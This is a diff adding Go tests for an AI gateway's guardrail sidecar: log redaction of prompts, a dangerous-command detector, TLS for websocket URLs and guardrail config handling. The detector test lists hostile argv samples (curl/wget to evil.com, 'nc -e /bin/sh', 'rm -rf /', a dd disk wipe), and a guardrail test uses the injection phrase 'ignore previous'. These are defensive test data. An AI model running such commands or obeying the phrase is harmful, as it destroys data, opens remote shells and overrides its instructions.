@@ -340,6 +340,97 @@ func TestLiteLLMBuildEnv(t *testing.T) {
 	}
 }
 
+func TestStreamLogRedactsSensitiveLines(t *testing.T) {
+	llm := &LiteLLMProcess{}
+
+	lines := []string{
+		// Operational lines that must NOT be redacted
+		"INFO: Starting server",
+		"DEBUG: loaded config",
+		`INFO: Usage: prompt_tokens=150, completion_tokens=42, total_tokens=192`,
+		`POST /chat/completions content-type: application/json content-length: 512`,
+		"ERROR: upstream timeout — message delivery failed",
+		"INFO: processing request",
+		"WARN: high latency detected",
+		// Sensitive JSON payloads that MUST be redacted
+		`{"content": "secret user data here"}`,
+		`{"messages": [{"role": "user", "content": "tell me a secret"}]}`,
+		`Response: {"choices":[{"message":{"content":"the answer is 42"}}]}`,
+	}
+
+	input := strings.Join(lines, "\n") + "\n"
+
+	oldStderr := os.Stderr
+	r, w, _ := os.Pipe()
+	os.Stderr = w
+
+	llm.streamLog("test", strings.NewReader(input))
+
+	w.Close()
+	os.Stderr = oldStderr
+
+	var buf bytes.Buffer
+	io.Copy(&buf, r)
+	output := buf.String()
+
+	// Operational lines pass through verbatim
+	for _, safe := range []string{
+		"Starting server",
+		"loaded config",
+		"prompt_tokens=150",
+		"completion_tokens=42",
+		"content-type: application/json",
+		"content-length: 512",
+		"message delivery failed",
+		"processing request",
+		"high latency",
+	} {
+		if !strings.Contains(output, safe) {
+			t.Errorf("operational line containing %q should appear in output", safe)
+		}
+	}
+
+	// Sensitive payloads must be redacted
+	for _, secret := range []string{
+		"secret user data",
+		"tell me a secret",
+		"the answer is 42",
+	} {
+		if strings.Contains(output, secret) {
+			t.Errorf("sensitive payload %q should be redacted, not printed verbatim", secret)
+		}
+	}
+
+	redactCount := strings.Count(output, "(redacted:")
+	if redactCount != 3 {
+		t.Errorf("expected 3 redacted lines, got %d\nfull output:\n%s", redactCount, output)
+	}
+}
+
+func TestContainsSensitivePayload(t *testing.T) {
+	tests := []struct {
+		line string
+		want bool
+	}{
+		{`{"content": "hello"}`, true},
+		{`{"messages": []}`, true},
+		{`"message": "secret"`, true},
+		{`"prompt": "do something"`, true},
+		{`content-type: application/json`, false},
+		{`content-length: 1024`, false},
+		{`prompt_tokens=150, completion_tokens=42`, false},
+		{`ERROR: connection reset — message delivery failed`, false},
+		{`INFO: Starting server on port 8080`, false},
+		{`Usage: {"prompt_tokens": 150, "completion_tokens": 42}`, false},
+	}
+	for _, tc := range tests {
+		got := containsSensitivePayload(tc.line)
+		if got != tc.want {
+			t.Errorf("containsSensitivePayload(%q) = %v, want %v", tc.line, got, tc.want)
+		}
+	}
+}
+
 // ---------------------------------------------------------------------------
 // Frame types / serialization tests
 // ---------------------------------------------------------------------------
@@ -991,6 +1082,45 @@ func TestIsCommandDangerousCaseInsensitive(t *testing.T) {
 	}
 }
 
+func TestIsArgvDangerous(t *testing.T) {
+	r := &EventRouter{}
+	tests := []struct {
+		argv []string
+		want bool
+	}{
+		{nil, false},
+		{[]string{}, false},
+		{[]string{"ls", "-la"}, false},
+		{[]string{"cat", "file.txt"}, false},
+		{[]string{"curl", "http://evil.com"}, true},
+		{[]string{"/usr/bin/curl", "http://evil.com"}, true},
+		{[]string{"wget", "http://evil.com"}, true},
+		{[]string{"/usr/bin/nc", "-e", "/bin/sh"}, true},
+		{[]string{"bash", "-c", "echo hello"}, true},
+		{[]string{"rm", "-rf", "/"}, true},
+		{[]string{"dd", "if=/dev/zero", "of=/dev/sda"}, true},
+		{[]string{"python3", "-c", "import os"}, false},
+		{[]string{"python", "-c", "print('hello')"}, true},
+		{[]string{"echo", "safe command"}, false},
+	}
+	for _, tt := range tests {
+		got := r.isArgvDangerous(tt.argv)
+		if got != tt.want {
+			t.Errorf("isArgvDangerous(%v) = %v, want %v", tt.argv, got, tt.want)
+		}
+	}
+}
+
+func TestApprovalDangerousChecksArgvWhenRawCmdEmpty(t *testing.T) {
+	r := &EventRouter{}
+	if !r.isArgvDangerous([]string{"curl", "http://evil.com"}) {
+		t.Error("argv with curl should be dangerous even if rawCmd is empty")
+	}
+	if r.isCommandDangerous("") {
+		t.Error("empty rawCmd should not be dangerous on its own")
+	}
+}
+
 // ---------------------------------------------------------------------------
 // EventRouter.Route tests
 // ---------------------------------------------------------------------------
@@ -1206,8 +1336,8 @@ func TestClientWsURL(t *testing.T) {
 	cfg := &config.GatewayConfig{Host: "10.0.0.5", Port: 18789}
 	c := &Client{cfg: cfg}
 	got := c.wsURL()
-	if got != "ws://10.0.0.5:18789" {
-		t.Errorf("wsURL() = %q, want ws://10.0.0.5:18789", got)
+	if got != "wss://10.0.0.5:18789" {
+		t.Errorf("wsURL() = %q, want wss://10.0.0.5:18789 (non-local host must use TLS)", got)
 	}
 }
 
@@ -1217,6 +1347,38 @@ func TestClientWsURLLocalhost(t *testing.T) {
 	got := c.wsURL()
 	if got != "ws://127.0.0.1:9999" {
 		t.Errorf("wsURL() = %q, want ws://127.0.0.1:9999", got)
+	}
+}
+
+func TestClientWsURLExplicitTLS(t *testing.T) {
+	cfg := &config.GatewayConfig{Host: "127.0.0.1", Port: 9999, TLS: true}
+	c := &Client{cfg: cfg}
+	got := c.wsURL()
+	if got != "wss://127.0.0.1:9999" {
+		t.Errorf("wsURL() = %q, want wss://127.0.0.1:9999 (explicit TLS=true)", got)
+	}
+}
+
+func TestRequiresTLS(t *testing.T) {
+	tests := []struct {
+		host string
+		tls  bool
+		want bool
+	}{
+		{"127.0.0.1", false, false},
+		{"localhost", false, false},
+		{"::1", false, false},
+		{"", false, false},
+		{"10.0.0.5", false, true},
+		{"gateway.example.com", false, true},
+		{"127.0.0.1", true, true},
+	}
+	for _, tt := range tests {
+		cfg := &config.GatewayConfig{Host: tt.host, TLS: tt.tls}
+		got := cfg.RequiresTLS()
+		if got != tt.want {
+			t.Errorf("RequiresTLS(host=%q, tls=%v) = %v, want %v", tt.host, tt.tls, got, tt.want)
+		}
 	}
 }
 
@@ -2676,6 +2838,44 @@ func TestHandleGuardrailEvaluate_Fallback(t *testing.T) {
 	}
 }
 
+func TestHandleGuardrailEvaluate_FallbackObserveMode(t *testing.T) {
+	store, logger := testStoreAndLogger(t)
+	api := &APIServer{health: NewSidecarHealth(), logger: logger, store: store}
+
+	body, _ := json.Marshal(guardrailEvaluateRequest{
+		Direction:   "prompt",
+		Model:       "gpt-4",
+		Mode:        "observe",
+		ScannerMode: "local",
+		LocalResult: &policy.GuardrailScanResult{
+			Action:   "block",
+			Severity: "HIGH",
+			Findings: []string{"ignore previous"},
+			Reason:   "matched: ignore previous",
+		},
+		ContentLength: 200,
+		ElapsedMs:     5.0,
+	})
+	req := httptest.NewRequest(http.MethodPost, "/v1/guardrail/evaluate", bytes.NewReader(body))
+	w := httptest.NewRecorder()
+	api.handleGuardrailEvaluate(w, req)
+
+	if w.Result().StatusCode != http.StatusOK {
+		t.Fatalf("status = %d, want %d; body: %s", w.Result().StatusCode, http.StatusOK, w.Body.String())
+	}
+
+	var resp policy.GuardrailOutput
+	if err := json.NewDecoder(w.Result().Body).Decode(&resp); err != nil {
+		t.Fatalf("decode: %v", err)
+	}
+	if resp.Action != "alert" {
+		t.Errorf("action = %q, want alert (observe mode must not block)", resp.Action)
+	}
+	if resp.Severity != "HIGH" {
+		t.Errorf("severity = %q, want HIGH", resp.Severity)
+	}
+}
+
 func TestHandleGuardrailEvaluate_CleanInput(t *testing.T) {
 	store, logger := testStoreAndLogger(t)
 	api := &APIServer{health: NewSidecarHealth(), logger: logger, store: store}
@@ -2788,6 +2988,129 @@ func TestHandleGuardrailEvaluate_BothScanners(t *testing.T) {
 	if resp.Severity != "HIGH" {
 		t.Errorf("severity = %q, want HIGH (Cisco escalates)", resp.Severity)
 	}
+}
+
+func TestHandleGuardrailConfig_PatchRollbackOnWriteFailure(t *testing.T) {
+	store, logger := testStoreAndLogger(t)
+	api := &APIServer{
+		health: NewSidecarHealth(),
+		logger: logger,
+		store:  store,
+		scannerCfg: &config.Config{
+			DataDir: "/nonexistent/path/that/will/fail",
+			Guardrail: config.GuardrailConfig{
+				Mode:        "observe",
+				ScannerMode: "local",
+			},
+		},
+	}
+
+	body, _ := json.Marshal(map[string]string{
+		"mode":         "action",
+		"scanner_mode": "both",
+	})
+	req := httptest.NewRequest(http.MethodPatch, "/v1/guardrail/config", bytes.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	api.handleGuardrailConfig(w, req)
+
+	if w.Result().StatusCode != http.StatusInternalServerError {
+		t.Fatalf("status = %d, want %d; body: %s",
+			w.Result().StatusCode, http.StatusInternalServerError, w.Body.String())
+	}
+
+	if api.scannerCfg.Guardrail.Mode != "observe" {
+		t.Errorf("mode = %q, want observe (should rollback)", api.scannerCfg.Guardrail.Mode)
+	}
+	if api.scannerCfg.Guardrail.ScannerMode != "local" {
+		t.Errorf("scanner_mode = %q, want local (should rollback)", api.scannerCfg.Guardrail.ScannerMode)
+	}
+}
+
+func TestHandleGuardrailConfig_PatchSuccess(t *testing.T) {
+	store, logger := testStoreAndLogger(t)
+	tmpDir := t.TempDir()
+	api := &APIServer{
+		health: NewSidecarHealth(),
+		logger: logger,
+		store:  store,
+		scannerCfg: &config.Config{
+			DataDir: tmpDir,
+			Guardrail: config.GuardrailConfig{
+				Mode:        "observe",
+				ScannerMode: "local",
+			},
+		},
+	}
+
+	body, _ := json.Marshal(map[string]string{
+		"mode":         "action",
+		"scanner_mode": "both",
+	})
+	req := httptest.NewRequest(http.MethodPatch, "/v1/guardrail/config", bytes.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	api.handleGuardrailConfig(w, req)
+
+	if w.Result().StatusCode != http.StatusOK {
+		t.Fatalf("status = %d, want %d; body: %s",
+			w.Result().StatusCode, http.StatusOK, w.Body.String())
+	}
+
+	if api.scannerCfg.Guardrail.Mode != "action" {
+		t.Errorf("mode = %q, want action", api.scannerCfg.Guardrail.Mode)
+	}
+	if api.scannerCfg.Guardrail.ScannerMode != "both" {
+		t.Errorf("scanner_mode = %q, want both", api.scannerCfg.Guardrail.ScannerMode)
+	}
+}
+
+func TestHandleGuardrailConfig_ConcurrentAccess(t *testing.T) {
+	store, logger := testStoreAndLogger(t)
+	tmpDir := t.TempDir()
+	api := &APIServer{
+		health: NewSidecarHealth(),
+		logger: logger,
+		store:  store,
+		scannerCfg: &config.Config{
+			DataDir: tmpDir,
+			Guardrail: config.GuardrailConfig{
+				Mode:        "observe",
+				ScannerMode: "local",
+			},
+		},
+	}
+
+	const N = 50
+	var wg sync.WaitGroup
+	wg.Add(N * 2)
+
+	for i := 0; i < N; i++ {
+		go func() {
+			defer wg.Done()
+			mode := "action"
+			if i%2 == 0 {
+				mode = "observe"
+			}
+			body, _ := json.Marshal(map[string]string{"mode": mode})
+			req := httptest.NewRequest(http.MethodPatch, "/v1/guardrail/config", bytes.NewReader(body))
+			req.Header.Set("Content-Type", "application/json")
+			w := httptest.NewRecorder()
+			api.handleGuardrailConfig(w, req)
+		}()
+
+		go func() {
+			defer wg.Done()
+			req := httptest.NewRequest(http.MethodGet, "/v1/guardrail/config", nil)
+			w := httptest.NewRecorder()
+			api.handleGuardrailConfig(w, req)
+			if w.Result().StatusCode != http.StatusOK {
+				t.Errorf("GET status = %d, want 200", w.Result().StatusCode)
+			}
+		}()
+	}
+
+	wg.Wait()
 }
 
 func TestBuildEnvIncludesScannerMode(t *testing.T) {
